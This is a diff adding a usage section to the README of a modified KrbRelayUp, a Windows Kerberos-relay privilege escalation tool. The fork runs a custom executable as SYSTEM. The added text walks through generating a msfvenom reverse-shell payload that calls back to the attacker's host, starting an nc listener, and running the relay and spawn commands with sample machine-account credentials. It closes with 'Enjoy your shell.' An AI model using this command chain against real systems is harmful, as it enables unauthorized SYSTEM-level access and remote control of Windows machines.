@@ -1,3 +1,21 @@
+# Modified version of KrbRelayUp to execute custom executables
+This version of KrbRelayUp.exe runs C:\Temp\update.exe instead of opening a new commad prompt. Useful if you don't have RDP access to a machine and need to get a reverse shell as SYSTEM. 
+
+# Example Usage with msfvenom payloads
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=443 EXITFUNC=thread -f exe > update.exe`
+
+Make sure to place your binary `update.exe` under `C:\Temp`, otherwise it won't be executed. Start a reverse shell:
+
+`sudo rlwrap nc -nvlp 443`
+
+And run KrbRelayUp exploit on the windows machine:
+
+`./KrbRelayUp.exe relay -c -cn machAccount$ -cp pass@123`
+
+`./KrbRelayUp.exe spawn -m rbcd -d <bla.local> -dc <DC.bla.local> -cn machAccount$ -cp pass@123`
+
+Enjoy your shell.
 
 # KrbRelayUp
 Simple wrapper around some of the features of [Rubeus](https://github.com/GhostPack/Rubeus/) and [KrbRelay](https://github.com/cube0x0/KrbRelay) (and a few other honorable mentions in the acknowledgements section) in order to streamline the abuse of the following attack primitive:
